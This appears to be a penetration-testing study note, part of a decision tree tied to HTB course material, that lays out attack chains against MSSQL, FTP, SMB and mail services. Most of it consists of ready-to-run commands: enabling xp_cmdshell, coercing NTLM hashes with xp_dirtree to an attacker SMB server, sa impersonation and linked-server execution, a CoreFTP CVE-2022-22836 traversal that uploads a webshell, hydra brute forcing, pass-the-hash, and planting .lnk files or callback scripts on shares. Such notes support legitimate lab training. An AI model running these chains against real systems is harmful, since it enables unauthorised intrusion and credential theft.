# Service Attacks, Decision Tree

Part of [[DECISION TREE]]. "I have access to service X — what's the attack chain?" Covers MSSQL, FTP, SMB, and web services.

---

## MSSQL Attack Chain

### Got MSSQL credentials (or anonymous access) — what can I escalate to?

Work through this chain in order — each step unlocks the next if the simpler ones don't yield access:

**Step 1 — Get a client connected:**
```bash
# Linux
impacket-mssqlclient <domain>/<user>:<pass>@<target>   # Windows Auth: add -windows-auth
# Windows (on target)
sqlcmd -S <target> -U <user> -P <pass>    # use "go" to execute; -Q for one-liner
```

**Step 2 — Enumerate:**
```sql
SELECT name FROM master.dbo.sysdatabases;     -- list databases
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'dbo';  -- list tables
SELECT TOP 5 * FROM <table>;                  -- sample data
```

**Step 3 — Enable and run xp_cmdshell (if sysadmin):**
```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

**Step 4 — If xp_cmdshell is blocked: coerce an NTLM hash with xp_dirtree:**
```sql
EXECUTE master..xp_dirtree '\\<kali-ip>\share', 1, 1;
```
Catch the hash with impacket-smbserver on Kali, then crack (hashcat -m 5600) or relay.
```bash
# Kali: before running the MSSQL command
sudo impacket-smbserver -smb2support share /tmp/share
```

**Step 5 — If you can't run commands: check for impersonation:**
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;           -- should now show 'sa'
EXECUTE xp_cmdshell 'whoami'; -- now try again as sa
```

**Step 6 — Check linked servers:**
```sql
SELECT srvname, isremote FROM master..sysservers;
EXECUTE ('SELECT SYSTEM_USER') AT [<linked-server-name>];
-- Nested '' escaping for quotes inside AT block:
EXECUTE ('EXECUTE (''xp_cmdshell ''''whoami'''''') AT [INNER_SERVER]') AT [OUTER_SERVER];
```

→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.6 MSSQL — xp_dirtree UNC Hash Coercion|CS.6]] through [[Attacking Common Services (HTB Supplementary)#CS.9 MSSQL — Linked Server Execution|CS.9]]

---

## FTP Attack Chain

### Got FTP access — what to do

**Step 1 — Try anonymous first:**
```bash
ftp <target>      # username: anonymous, password: (blank or any email)
```
Once in: `ls -la` to list (hidden files too), `prompt` to disable per-file confirmation, `mget *` to grab everything.

**Step 2 — Check for write access to web root:**
```bash
# Check if FTP root overlaps with web root
put test.txt        # from ftp session
curl http://<target>/test.txt    # verify from Kali
```
If writable: upload a webshell to gain code execution.

**Step 3 — If no anonymous access: brute force (slow, -t 1):**
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 1
```

**Step 4 — Check for known CVEs:**
→ ProFTPd 1.3.5: `mod_copy` module allows unauthenticated file copy (`SITE CPFR`/`SITE CPTO`)
→ CoreFTP 725: directory traversal via PUT request — see below

---

### CoreFTP Server ≤ build 725 — directory traversal via HTTP PUT (CVE-2022-22836)

Allows writing arbitrary files outside the FTP root via the HTTP interface (default port 443):
```bash
curl -k -X PUT -H 'Content-Type: application/x-www-form-urlencoded' \
  --path-as-is "https://<target>:443/<traversal>" \
  -d @webshell.php
```
`<traversal>` example: `/../../../../../../xampp/htdocs/webshell.php` (adapt depth and web root to target).
`--path-as-is` is critical — without it curl normalises the `../` sequences away before sending.

→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.3 CoreFTP Directory Traversal (CVE-2022-22836)|CS.3]]

---

## SMB Attack Chain

### Got SMB access — enumeration first, then exploit

**Step 1 — Null session check:**
```bash
smbclient -N -L //<target>          # -N = no password
enum4linux -A <target>              # full auto-enum: shares, users, groups, OS
rpcclient -U "" -N <target>         # null session for manual RPC queries
```

**Step 2 — Access shares:**
```bash
smbclient //<target>/<share> -N     # anonymous
smbclient //<target>/<share> -U <user>%<pass>
# Inside: prompt (disable per-file prompt), mget * (grab all), put file.txt (test write access)
```

**Step 3 — If you have creds: check for PtH / relay opportunities:**
→ NTLM hash: try `impacket-psexec <domain>/<user>@<target> --hashes :<NT-hash>` (needs local admin)
→ Net-NTLMv2: relay with ntlmrelayx rather than crack if rockyou fails
→ See [[Secrets & Credentials (Decision Tree)#Got a hash from a Windows machine -- what type is it and what can you do?|hash type guide]]

**Step 4 — Check write access to shares containing scripts/binaries:**
→ Write a malicious script that calls back when executed by another user or service
→ Drop a `.lnk` or `.url` file pointing to `\\kali-ip\share` — any user browsing the share with Windows Explorer triggers an SMB auth (captured by Responder)

→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.13 SMB Enumeration and Null Sessions|CS.13]]

---

## Email Service Attack Chain (SMTP + POP3)

### Got SMTP — enumerate users, then try to send

```bash
# User enumeration — RCPT TO method (most reliable, works when VRFY is blocked)
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -D <domain> -t <target>

# Brute force SMTP auth (email-format username)
hydra -l user@domain.com -P /usr/share/wordlists/rockyou.txt smtp://<target>
```

### Got POP3 credentials — retrieve emails manually

```bash
nc -nv <target> 110     # or telnet <target> 110
USER <username>
PASS <password>
LIST                    # list messages (N bytes each)
RETR 1                  # read message 1
QUIT
```
→ Emails often contain credentials, internal hostnames, or attachment leads — always read them.
→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.1 Hydra SMTP with Email-Format Usernames|CS.1]], [[Attacking Common Services (HTB Supplementary)#CS.2 POP3 Manual nc Session|CS.2]]

#### Tags: #DecisionTree #ServiceAttacks #MSSQL #FTP #SMB #SMTP #POP3 #CoreFTP #xpdirtree #Impersonation #LinkedServer
